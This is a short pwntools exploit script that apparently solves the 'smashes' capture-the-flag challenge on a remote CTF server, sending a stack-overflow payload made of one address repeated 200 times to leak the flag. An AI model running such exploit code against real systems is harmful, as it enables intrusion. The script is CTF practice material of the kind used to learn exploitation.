from pwn import *

#n = process('./smashes')
n = remote('pwn.jarvisoj.com', 9877)

n.recvuntil('name?')
payload = p64(0x400d20) * 200
n.sendline(payload)
n.recv()
n.sendline()
n.interactive()
